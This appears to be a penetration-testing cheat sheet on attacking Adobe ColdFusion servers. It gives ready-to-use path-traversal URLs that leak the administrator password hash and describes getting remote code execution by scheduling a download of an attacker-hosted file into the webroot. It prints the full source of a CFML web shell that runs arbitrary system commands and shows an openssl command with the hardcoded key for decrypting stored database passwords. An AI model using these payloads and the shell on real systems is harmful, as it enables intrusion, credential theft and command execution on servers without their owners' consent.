# Adobe Coldfusion

### Introduction&#x20;

* ColdFusion is basically just yet another commercial web application development platform. The programming language used with that platform is also commonly called ColdFusion, but the correct name of it is [ColdFusion Markup Language (CFML)](http://en.wikipedia.org/wiki/CFML).
* Vulnerabilities against ColdFusion application are the typical ones so you can find Local File Disclosure (LFD), SQL injection and Cross-site Scripting as well.&#x20;
* And of course, ColdFusion by default runs as NT-Authority\SYSTEM (Windows) or nobody (Linux), thus making the ColdFusion+Windows combination a very desirable target.

### Coldfusion LFI

* In unpatched versions of ColdFusion 6, 7 and 8 there is a local file inclusion vulnerability ([APSB10-18](http://www.adobe.com/support/security/bulletins/apsb10-18.html)) which you can exploit to get the administrator password hash from the password.properties file.
* ColdFusion 6:

```
http://[HOSTNAME:PORT]/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\CFusionMX\lib\password.properties%en
```

* ColdFusion 7:

```
http://[HOSTNAME:PORT]/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\CFusionMX7\lib\password.properties%en
```

* ColdFusion 8:

```
http://[HOSTNAME:PORT]/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%en
```

* All versions (according to [this site](http://www.blackhatlibrary.net/Coldfusion\_hacking) \[3], but I have never tried it):

```
http://site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties%en
```

* If the local file inclusion is successful, the password hash (SHA1) is written back to you on the administrative login page like this (hash was reducted):

### Coldfusion Authenticated RCE

* Once we gain access to the administration panel we can upload a CFM shell.
* Go to the `Debugging & Loging / Scheduled Taks` menu element&#x20;
* Add a scheduled task that would download our CFML script from our webserver to the ColdFusion server‚Äôs webroot.&#x20;
* Make sure you schedule the deployment to some reasonable time, so 5-10 minutes from your current time&#x20;
* Here is an example on how it looks like:

* You can find a few CFML shells

```

    <html>
    <body>
     
    Notes:<br><br>
    <ul>
    <li>Prefix DOS commands with ‚Äúc:\windows\system32\cmd.exe /c <command>‚Äù or wherever cmd.exe is<br>
    <li>Options are, of course, the command line options you want to run
    <li>CFEXECUTE could be removed by the admin. If you have access to CFIDE/administrator you can re-enable it
    </ul>
    <p>
    <cfoutput>
    <table>
    <form method=‚ÄúPOST‚Äù action=‚Äúcfexec.cfm‚Äù>
    <tr><td>Command:</td><td><input type=text name=‚Äùcmd‚Äù size=50
    <cfif isdefined(‚Äúform.cmd‚Äù)>value=‚Äù#form.cmd#‚Äù</cfif>><br></td></tr>
    <tr><td>Options:</td><td> <input type=text name=‚Äùopts‚Äù size=50
    <cfif isdefined(‚Äúform.opts‚Äù)>value=‚Äù#form.opts#‚Äù</cfif>><br></td></tr>
    <tr><td>Timeout:</td><td> <input type=text name=‚Äùtimeout‚Äù size=4
    <cfif isdefined(‚Äúform.timeout‚Äù)>value=‚Äù#form.timeout#‚Äù
    <cfelse>value=‚Äù5‚Ä≥</cfif>></td></tr>
    </table>
    <input type=submit value=‚ÄúExec‚Äù>
    </form>
     
    <cfif isdefined(‚Äúform.cmd‚Äù)>
    <cfsavecontent variable=‚ÄúmyVar‚Äù>
    <cfexecute name = ‚Äú#Form.cmd#‚Äù arguments = ‚Äú#Form.opts#‚Äù timeout = ‚Äú#Form.timeout#‚Äù> </cfexecute>
    </cfsavecontent>
    <pre> #myVar# </pre>
    </cfif>
    </cfoutput>
    </body>
    </html>
```



And it looks like this once it is uploaded (I had to use the Options fields to fit in the screenshot):

### Getting database passwords from Data Sources

* Once you have access to the administrative panel, you can also get the connection strings and credentials to databases connected to ColdFusion.&#x20;
*   Depending again on the ColdFusion version, the credentials are stored in different places, but you might be able to retrieve the passwords from the administrative panel as well! ![üôÇ](https://s.w.org/images/core/emoji/11/svg/1f642.svg)


*   For ColdFusion 6 and 7 the passwords for DataSources encrypted in the following XML files:

    ```
    [ColdFusion_Install_Dir]\lib\neo-query.xml
    ```
*   For ColdFusion 8, 9 and 10:

    ```
    [ColdFusion_Install_Dir]\lib\neo-datasource.xml
    ```


* The most important thing is that by decompiling&#x20;
* `\lib\cfusion.jar` and looking at the `\coldfusion\sql\DataSourceDef.class`&#x20;
* You can find the seed for the key `(‚Äú0yJ!@1$r8p0L@r1$6yJ!@1rj‚Äù)` and algorithm (3DES and then Base64 encoding) used.
* In case of ColdFusion 6, 7 and 8, the encrypted passwords can be found just by looking at the page source of the individual data sources on the administrative panel (on ColdFusion 9 and 10 this was fixed and you will only see \*\*\*\*\*\*\*\* in the page source for the passwords).
*   No matter how you obtain the encrypted passwords, you can decrypt them with openSSL like this:

    ```
    echo [encrypted_and_base64_encoded_password] | openssl des-ede3 -a -d -K 30794A21403124723870304C4072312436794A214031726A -iv 30794A2140312472; echo
    ```

### Metasploit

* You might also consider using Metasploit to exploit some of the above vulnerabilities:
